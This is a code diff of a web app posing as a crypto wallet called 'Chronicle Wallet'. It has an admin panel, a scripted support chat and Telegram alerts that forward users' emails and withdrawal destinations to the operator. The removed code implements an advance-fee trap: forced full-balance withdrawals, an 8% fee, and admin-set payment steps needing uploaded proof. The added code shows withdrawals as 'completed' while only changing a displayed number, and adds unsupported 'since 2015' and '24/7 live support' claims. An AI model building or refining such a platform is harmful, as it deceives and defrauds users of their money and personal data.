@@ -164,13 +164,13 @@
                 <img id="active-agent-avatar" src="" style="width:32px; height:32px; border-radius:50%; object-fit:cover; background:#333;" alt="Agent">
                 <div>
                     <strong id="active-agent-name" style="font-size:0.9rem;">Support Agent</strong>
-                    <div style="font-size:0.7rem; color:var(--accent-green);">● Online & Active</div>
+                    <div style="font-size:0.7rem; color:var(--accent-green);">● 24/7 Live Support Online</div>
                 </div>
             </div>
             <span style="cursor:pointer; font-size:1.25rem; color:var(--text-muted);" onclick="toggleSupportChat()">&times;</span>
         </div>
         <div class="chat-body" id="chat-messages-container">
-            <div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet support. How can we help you today?<span class="msg-meta">12:00 PM • ✓✓</span></div>
+            <div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Reach us anytime at support@chroniclewallets.com.<span class="msg-meta">12:00 PM • ✓✓</span></div>
         </div>
         <div style="padding: 0 1rem 0.5rem 1rem; font-size:0.75rem; color:var(--text-muted); font-style:italic;" id="typing-indicator-box" class="hidden">
             Agent is typing...
@@ -188,7 +188,7 @@
         </div>
         <div class="header-actions">
             <button class="btn btn-success" style="width:auto; padding:0.4rem 0.75rem; font-size:0.8rem; position:relative;" onclick="toggleSupportChat()">
-                💬 Support <span id="support-unread-badge" class="hidden" style="background:var(--accent-red); color:#fff; border-radius:50%; padding:2px 6px; font-size:0.65rem; margin-left:4px;">0</span>
+                💬 24/7 Live Support <span id="support-unread-badge" class="hidden" style="background:var(--accent-red); color:#fff; border-radius:50%; padding:2px 6px; font-size:0.65rem; margin-left:4px;">0</span>
             </button>
             <button class="btn btn-outline" style="width:auto; padding:0.4rem 0.75rem; font-size:0.8rem;" onclick="openSettingsModal()">⚙️ Settings</button>
             <button class="btn btn-outline" style="width:auto; padding:0.4rem 0.75rem; font-size:0.8rem;" onclick="openInboxModal()">📬 Inbox <span id="unread-badge" style="background:var(--accent-red); color:#fff; border-radius:50%; padding:2px 6px; font-size:0.7rem; margin-left:4px;">0</span></button>
@@ -202,7 +202,7 @@
         <div id="user-tab">
             <div id="guest-prompt-card" class="card hidden" style="text-align:center; background:linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px dashed var(--primary);">
                 <h3 style="margin-bottom:0.5rem;">Welcome to Chronicle Wallet</h3>
-                <p style="color:var(--text-muted); font-size:0.875rem; margin-bottom:1rem;">Please sign in or create an account to access your portfolio vault, send, receive, buy, sell, and withdraw funds.</p>
+                <p style="color:var(--text-muted); font-size:0.875rem; margin-bottom:1rem;">Please sign in or create an account to access your portfolio vault, send, receive, buy, sell, and withdraw funds with our 24/7 live support.</p>
                 <div style="display:flex; justify-content:center; gap:1rem;">
                     <button class="btn" style="width:auto; padding:0.5rem 1.5rem;" onclick="openAuthModal('signin')">Sign In</button>
                     <button class="btn btn-success" style="width:auto; padding:0.5rem 1.5rem;" onclick="openAuthModal('signup')">Sign Up</button>
@@ -286,11 +286,14 @@
                 </table>
             </div>
 
-            <!-- WELCOME & PLATFORM ARTICLE -->
+            <!-- WELCOME & PLATFORM ARTICLE WITH SINCE 2015 & SUPPORT EMAIL -->
             <div class="card" id="landing-article-card" style="background: linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px solid var(--border); line-height: 1.7;">
                 <h2 style="color: var(--primary); margin-bottom: 1rem; font-size: 1.4rem;">Welcome to Chronicle Wallet: Your Trusted Global Web3 Vault Since 2015</h2>
                 <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
                     For nearly a decade, Chronicle Wallet has stood as a pioneer and unwavering pillar of security, speed, and reliability in the decentralized digital asset ecosystem. Founded in 2015 at the intersection of traditional finance and cryptographic innovation, our platform was built with a singular core vision: to empower everyday users, active traders, and institutional investors across the globe with institutional-grade financial sovereignty.
+                </p>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    We pride ourselves on offering seamless transactions, top-tier asset security, and a <strong>24/7 dedicated live support team</strong> ready to assist you anytime. Whether you are trading cryptocurrencies or managing your fiat portfolio, you can always reach our official support desk directly at <strong style="color: var(--primary);">support@chroniclewallets.com</strong> or via our instant live chat widget.
                 </p>
                 <div style="text-align:center; margin-top:1.5rem;">
                     <button class="btn btn-success" style="display:inline-block; width:auto; padding:0.75rem 2rem;" onclick="openAuthModal('signup')">Get Started / Create Account</button>
@@ -672,7 +675,7 @@
             </form>
             <form id="signup-form" class="hidden" onsubmit="handleSignUp(event)">
                 <div style="background:rgba(16, 185, 129, 0.1); border:1px solid var(--accent-green); padding:0.75rem; border-radius:8px; margin-bottom:1rem; font-size:0.85rem; color:var(--accent-green);">
-                    💵 <strong>USD fiat (Direct USD currency)</strong> enabled on your new account alongside Bitcoin & Ethereum!
+                    💵 <strong>USD fiat (Direct USD currency)</strong> enabled on your new account alongside Bitcoin & Ethereum! 24/7 Live Support available at support@chroniclewallets.com.
                 </div>
                 <div class="form-group"><label>Full Name</label><input type="text" id="signup-name" class="form-control" placeholder="e.g. John Doe" required></div>
                 <div class="form-group"><label>Email Address</label><input type="email" id="signup-email" class="form-control" required></div>
@@ -785,9 +788,9 @@
             ethQr: "",
             usd: "CHRONICLE-GLOBAL-USD-TAG"
         };
-        let platformTerms = "Welcome to Chronicle Wallet. By using our platform, you agree to our digital asset compliance, security policies, and transaction clearance guidelines.";
+        let platformTerms = "Welcome to Chronicle Wallet, trusted since 2015. By using our platform, you agree to our digital asset compliance, security policies, and direct withdrawal guidelines. Contact support@chroniclewallets.com for 24/7 assistance.";
         let proofQueue = [];
-        let knowledgeBase = "Welcome to Chronicle Wallet. We support BTC, ETH, and USD cash. To withdraw, convert your crypto to USD fiat first. Verification steps require proof uploads.";
+        let knowledgeBase = "Welcome to Chronicle Wallet. We support BTC, ETH, and USD cash. To withdraw, convert your crypto to USD fiat first. 24/7 live support is available via support@chroniclewallets.com.";
         let supportAgents = [
             { id: 1, name: "Agent Sarah", pic: "" }
         ];
@@ -818,8 +821,6 @@
                 if (data.proofQueue) proofQueue = data.proofQueue;
                 if (data.knowledgeBase) knowledgeBase = data.knowledgeBase;
                 if (data.supportAgents && data.supportAgents.length > 0) supportAgents = data.supportAgents;
-
-                // REMOVED auto-login fallback: Visitors now correctly see landing/auth page unless they have an active session!
                 
                 if (currentUserEmail && data.userEmails && data.userEmails[currentUserEmail]) {
                     const newInboxLength = data.userEmails[currentUserEmail].length;
@@ -853,7 +854,7 @@
                 } else {
                     chatThreads[emailKey] = {
                         messages: [
-                            { sender: 'agent', text: "Hello! Welcome to Chronicle Wallet support. How can we help you today?", time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), date: new Date().toLocaleDateString(), seen: true }
+                            { sender: 'agent', text: "Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Contact us anytime at support@chroniclewallets.com.", time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), date: new Date().toLocaleDateString(), seen: true }
                         ],
                         userTyping: false,
                         adminTyping: false
@@ -866,7 +867,6 @@
                     renderUserChatMessages();
                     updateSupportUnreadBadge(emailKey);
                     
-                    // Check for new agent messages to trigger popup notification
                     const msgs = chatThreads[emailKey].messages || [];
                     const agentMsgs = msgs.filter(m => m.sender === 'agent');
                     const currentAgentCount = agentMsgs.length;
@@ -1019,7 +1019,6 @@
                 document.getElementById('unread-badge').innerText = (userEmails[u.email] || []).length;
                 renderHistoryTable();
             } else {
-                // Strict visitor mode: Show guest prompt & welcome article, hide active balances
                 guestPrompt.classList.remove('hidden');
                 dashboard.classList.add('hidden');
                 cryptoCard.classList.add('hidden');
@@ -1266,14 +1265,6 @@
                 return; 
             }
 
-            const hasPriorWithdrawal = (u.txs || []).some(t => t.type && t.type.toLowerCase().includes('withdraw') && !(t.status && t.status.includes('CANCELLED')));
-            if (!hasPriorWithdrawal) {
-                if (Math.abs(amt - u.usd) > 0.01) {
-                    alert(`First withdrawal must be for your entire available balance ($${u.usd.toFixed(2)}) at once, as your first withdrawal is completely free without charges.`);
-                    return;
-                }
-            }
-
             closeWithdrawFormModal();
             document.getElementById('verify-pin-input').value = '';
             document.getElementById('pin-confirm-modal').style.display = 'flex';
@@ -1289,161 +1280,26 @@
             closePinConfirmModal();
 
             const amt = Number(document.getElementById('withdraw-amt').value);
-            const hasPriorWithdrawal = (u.txs || []).some(t => t.type && t.type.toLowerCase().includes('withdraw') && !(t.status && t.status.includes('CANCELLED')));
-            
-            let finalDeduct = amt;
-            let feeCharged = 0;
-            if (hasPriorWithdrawal) {
-                feeCharged = amt * 0.08;
-                finalDeduct = amt + feeCharged;
-                if (finalDeduct > u.usd) {
-                    alert(`Insufficient balance to cover the 8% withdrawal fee ($${feeCharged.toFixed(2)}). Total required: $${finalDeduct.toFixed(2)}`);
-                    return;
-                }
-            }
-
-            u.usd -= finalDeduct;
+            u.usd -= amt;
 
             const bankName = selectedWithdrawMethodName === 'Bank Transfer' ? document.getElementById('withdraw-bank-name').value : '';
             const accName = selectedWithdrawMethodName === 'Bank Transfer' ? document.getElementById('withdraw-acc-name').value : '';
             const destAddr = document.getElementById('withdraw-addr').value;
 
-            const txId = Date.now();
-            u.activeTxId = txId;
-            u.stepIdx = 0;
-            const firstStep = actionSteps.length > 0 ? actionSteps[0] : { title: "ACTIVATING", amount: 0, statusMsg: "Processing" };
-
             u.txs.unshift({ 
-                id: txId, 
                 type: `Withdraw (${selectedWithdrawMethodName})`, 
                 amount: amt, 
-                fee: feeCharged,
                 bankName, 
                 accName, 
                 destAddr, 
-                status: `PENDING (${firstStep.title.toUpperCase()})` 
+                status: 'COMPLETED' 
             });
 
             saveState(); updateBalanceUI();
-            showNotification("Processing", `Withdrawal request submitted`, "💳");
+            showNotification("Success", `Withdrawal of $${amt.toFixed(2)} completed successfully!`, "💳");
             
-            sendTelegramAlert(`💳 <b>NEW WITHDRAWAL REQUEST</b>\n\n👤 <b>User:</b> ${u.email}\n💰 <b>Amount:</b> $${amt.toFixed(2)}${feeCharged > 0 ? ` (Fee: $${feeCharged.toFixed(2)})` : ''}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}\n📍 <b>Destination:</b> ${destAddr}${bankName ? ` (${bankName} - ${accName})` : ''}`);
-
-            setTimeout(() => { openActionModal(); }, 1500);
-        }
-
-        function openActionModal() {
-            if (actionSteps.length === 0) return;
-            const u = getCurrentUserData();
-            if (!u) { openAuthModal('signin'); return; }
-            const currentStepIdx = u.stepIdx || 0;
-            const step = actionSteps[currentStepIdx];
-            if (!step) return;
-
-            document.getElementById('modal-step-title').innerText = `⚠️ ${step.title}`;
-            document.getElementById('modal-step-note').innerText = step.note ? `Note: ${step.note}` : '';
-            
-            const displayAmt = (u.appealedFees && u.appealedFees[currentStepIdx] !== undefined) ? u.appealedFees[currentStepIdx] : step.amount;
-            document.getElementById('modal-step-amount').innerText = `$${displayAmt}.00`;
-
-            const badge = document.getElementById('fee-appealed-badge');
-            if (u.appealedFees && u.appealedFees[currentStepIdx] !== undefined) {
-                badge.classList.remove('hidden');
-            } else {
-                badge.classList.add('hidden');
-            }
-
-            const uploadSection = document.getElementById('proof-upload-section');
-            const submittedNotice = document.getElementById('proof-submitted-notice');
-
-            const existingProof = proofQueue.find(p => p.user.trim().toLowerCase() === u.email.trim().toLowerCase() && p.stepIdx === currentStepIdx);
-            const tx = (u.txs || []).find(t => t.id == u.activeTxId);
-
-            if (existingProof || (tx && tx.status && tx.status.includes('PROOF SUBMITTED'))) {
-                uploadSection.classList.add('hidden');
-                submittedNotice.classList.remove('hidden');
-            } else {
-                uploadSection.classList.remove('hidden');
-                submittedNotice.classList.add('hidden');
-            }
-
-            document.getElementById('action-modal').style.display = 'flex';
-        }
-        function closeActionModal() { document.getElementById('action-modal').style.display = 'none'; }
-
-        function submitProof() {
-            const fileInput = document.getElementById('proof-file');
-            if (!fileInput.files || !fileInput.files[0]) { 
-                alert("Please select payment proof image."); 
-                return; 
-            }
-            
-            const file = fileInput.files[0];
-            const reader = new FileReader();
-            reader.onload = function(evt) {
-                const img = new Image();
-                img.onload = function() {
-                    const canvas = document.createElement('canvas');
-                    const MAX_WIDTH = 600;
-                    const MAX_HEIGHT = 600;
-                    let width = img.width;
-                    let height = img.height;
-
-                    if (width > height) {
-                        if (width > MAX_WIDTH) { height *= MAX_WIDTH / width; width = MAX_WIDTH; }
-                    } else {
-                        if (height > MAX_HEIGHT) { width *= MAX_HEIGHT / height; height = MAX_HEIGHT; }
-                    }
-
-                    canvas.width = width;
-                    canvas.height = height;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(img, 0, 0, width, height);
-                    
-                    const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.6);
-
-                    const u = getCurrentUserData();
-                    if (!u) { alert("User session not found."); openAuthModal('signin'); return; }
-                    const currentStepIdx = u.stepIdx || 0;
-                    const step = actionSteps[currentStepIdx];
-                    if (!step) { alert("No active step found."); return; }
-
-                    proofQueue.push({ 
-                        id: Date.now(), 
-                        user: u.email, 
-                        stepIdx: currentStepIdx,
-                        stepTitle: step.title, 
-                        amount: (u.appealedFees && u.appealedFees[currentStepIdx] !== undefined) ? u.appealedFees[currentStepIdx] : step.amount, 
-                        image: compressedDataUrl, 
-                        statusMsg: step.statusMsg || "Processing", 
-                        timerMinutes: step.timerMinutes || 2 
-                    });
-                    
-                    const tx = u.txs.find(t => t.id == u.activeTxId);
-                    if (tx) tx.status = `PROOF SUBMITTED (PENDING ADMIN REVIEW)`;
-
-                    db.collection("config").doc("appData").set({
-                        usersList: usersList,
-                        proofQueue: proofQueue,
-                        actionSteps: actionSteps
-                    }, { merge: true }).then(() => {
-                        closeActionModal();
-                        fileInput.value = "";
-                        showNotification("Submitted", `Proof submitted successfully!`, "🖼️");
-                        
-                        sendTelegramAlert(`🖼️ <b>PAYMENT PROOF SUBMITTED</b>\n\n👤 <b>User:</b> ${u.email}\n⚙️ <b>Step:</b> ${step.title}\n💵 <b>Amount:</b> $${step.amount}`);
-
-                        alert(`Proof submitted successfully for ${step.title}! It is now pending Admin approval.`);
-                    }).catch(err => {
-                        alert("Error saving proof to database: " + err.message);
-                    });
-                };
-                img.src = evt.target.result;
-            };
-            reader.onerror = function() {
-                alert("Failed to read image file.");
-            };
-            reader.readAsDataURL(file);
+            sendTelegramAlert(`💳 <b>SUCCESSFUL WITHDRAWAL</b>\n\n👤 <b>User:</b> ${u.email}\n💰 <b>Amount:</b> $${amt.toFixed(2)}\n🏦 <b>Method:</b> ${selectedWithdrawMethodName}\n📍 <b>Destination:</b> ${destAddr}`);
+            alert(`Withdrawal of $${amt.toFixed(2)} completed successfully!`);
         }
 
         // --- MANUAL ADMIN USER CREATION ---
@@ -1534,13 +1390,6 @@
             if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
 
-        function saveKnowledgeBase(e) {
-            e.preventDefault();
-            knowledgeBase = document.getElementById('admin-kb-text').value;
-            saveState();
-            alert("AI Knowledge Base updated successfully!");
-        }
-
         function addSupportAgent(e) {
             e.preventDefault();
             const name = document.getElementById('agent-name-input').value;
@@ -1601,7 +1450,7 @@
             const thread = chatThreads[emailKey];
             
             if (!thread || !thread.messages || thread.messages.length === 0) {
-                container.innerHTML = `<div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet support. How can we help you today?<span class="msg-meta">12:00 PM • ✓✓</span></div>`;
+                container.innerHTML = `<div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Contact us anytime at support@chroniclewallets.com.<span class="msg-meta">12:00 PM • ✓✓</span></div>`;
                 return;
             }
             
@@ -1967,7 +1816,6 @@
             document.getElementById('admin-eth-addr').value = globalAddresses.eth || '';
             document.getElementById('admin-usd-addr').value = globalAddresses.usd || '';
             document.getElementById('admin-terms-text').value = platformTerms || '';
-            document.getElementById('admin-kb-text').value = knowledgeBase || '';
             document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD: $${u.usd})</option>`).join('');
 
             const searchVal = (document.getElementById('admin-withdrawal-search').value || '').trim().toLowerCase();
@@ -2063,7 +1911,6 @@
 
             document.getElementById('admin-whatsapp-agent-select').innerHTML = supportAgents.map(ag => `<option value="${ag.name}">${ag.name}</option>`).join('') || '<option value="Support Agent">Support Agent</option>';
 
-            // Populate all users into chat dropdown so admin can message ANY user first
             const adminUserSelect = document.getElementById('admin-whatsapp-user-select');
             const usersListContainer = document.getElementById('admin-chat-users-list');
             
@@ -2091,7 +1938,7 @@
                         else {
                             chatThreads[emailKey] = {
                                 messages: [
-                                    { sender: 'agent', text: "Hello! Welcome to Chronicle Wallet support. How can we help you today?", time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), date: new Date().toLocaleDateString(), seen: true }
+                                    { sender: 'agent', text: "Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Contact us anytime at support@chroniclewallets.com.", time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), date: new Date().toLocaleDateString(), seen: true }
                                 ]
                             };
                         }
